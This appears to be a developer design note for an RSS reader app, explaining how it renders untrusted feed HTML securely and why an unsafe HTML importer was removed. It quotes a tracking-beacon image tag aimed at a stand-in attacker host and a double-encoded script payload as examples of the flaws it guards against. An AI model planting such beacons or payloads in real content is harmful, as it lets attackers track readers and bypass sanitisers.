# HTML Rendering in RSS Feeds

## Problem

RSS feeds put HTML markup in article descriptions and content:

```html
<p>This is a <strong>great</strong> article about <a href="...">SwiftUI</a></p>
```

Displayed naively, the tags show up as literal text. Displayed carelessly, the
markup executes.

## How the app renders feed HTML today

There are exactly two paths, chosen by how much trust and formatting the surface needs.

### 1. List rows and inline descriptions — plain text, no HTML engine

Rows render the pre-computed plain-text form:

```swift
article.plainTextDescription ?? article.articleDescription?.htmlToPlainText
```

`plainTextDescription` is derived once in `Article.init` (and backfilled for older
rows by `DatabaseMigration.backfillDerivedArticleFields`), so scrolling never pays
to strip HTML. The `??` fallback covers rows written before the field existed.

### 2. Article and Reddit bodies — a locked-down WKWebView

Full article content goes through `WKWebView` via `loadHTMLString(..., baseURL: nil)`,
wrapped by `createStyledHTML(...)`. That path is hardened in three ways, all in
`WebViewSecurity` (`Views/ArticleDetailSimple.swift`):

- `allowsContentJavaScript = false` on content configurations
- a Content-Security-Policy `<meta>` naming no `script-src` under `default-src 'none'`
- a deny-by-default navigation policy — only the initial in-memory document load is
  allowed; link taps are cancelled in place and opened externally only if
  `SafeURL` accepts the scheme

`EmbeddedMediaWebView` is the one content view that keeps JavaScript enabled, because
the setting is page-wide and would break the cross-origin oEmbed players it exists to
frame. Its wrapper document — the only attacker-supplied part — is still script-free
by CSP.

## String helpers (`Utilities/HTMLHelper.swift`)

All `nonisolated`, so background parsing and sync code can use them under
`SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor`:

```swift
"<p>Hello <b>world</b></p>".htmlToPlainText     // "Hello world"
"<p>Hello</p>".strippingHTML                    // tag removal
"AT&amp;T".decodeHTMLEntities()                 // "AT&T"
```

`decodeHTMLEntities()` is the single canonical decoder for the whole app. It scans
once and resumes after each replacement, so nothing it emits is re-read as an entity:
`&amp;lt;` decodes to the literal `&lt;`, never to `<`. Decode exactly once — see below.

Supported: `&amp; &lt; &gt; &quot; &apos; &nbsp; &rdquo; &ldquo; &rsquo; &lsquo;
&mdash; &ndash; &hellip;`, plus numeric (`&#8217;`) and hex (`&#x27;`) references.
Unknown or malformed references pass through untouched.

## Removed: `String.htmlToAttributedString`

The app used to render row descriptions with an `AttributedString` built by
`NSAttributedString(data:options:[.documentType: .html])`. **It was deleted**, along
with the `HTMLText` helper view, for two reasons:

1. **Main-thread hang.** The `.html` importer runs a full WebKit parse. The property
   was main-actor isolated and called per visible row while scrolling, with no length
   cap.
2. **Privacy / SSRF beacon.** The importer synchronously fetches externally referenced
   subresources. A description containing `<img src="http://attacker/track?u=1">` fired
   an outbound request from the reader's device — a read-receipt and IP-leak vector
   driven purely by feed content.

`TodayTests/RowDescriptionRenderingTests.swift` pins this: it renders the real row and
detail views with a beacon-carrying description behind a recording `URLProtocol` and
asserts zero requests, with a control test proving the recorder is actually in the
loading path.

Rich inline formatting in list rows is therefore not currently supported, and that is
deliberate. Anything needing it must not run on a scrolling path and must not hand
untrusted markup to an HTML engine that resolves remote subresources.

## Rules when touching this area

- **Decode entities exactly once.** Double-decoding reconstructs escaped markup
  (`&amp;amp;lt;script&amp;amp;gt;` → `<script>`) and defeats upstream sanitisers. The
  view seams go through `WebViewSecurity.decodeForRendering(_:)` so "once" lives in one
  assertable place.
- **Never add a second entity decoder.** There is one, in `HTMLHelper.swift`. Four
  copies previously drifted apart and two of them reconstructed live markup.
- **Never feed untrusted HTML to `NSAttributedString`'s HTML importer.** That is the
  bug this document now describes in the past tense.
- **Every new `WKWebView` needs a navigation delegate.**
  `WebViewNavigationPolicyTests.testEveryConstructedWebViewHasANavigationDelegate` hosts each
  WebView-bearing view for real and fails if a constructed `WKWebView` lacks one — but it
  iterates a **hand-maintained list**, and covers only the iOS variants (the macOS AppKit halves
  cannot be hosted from the iOS test target). Add your view to that list when you add one; the
  test cannot discover it for you.
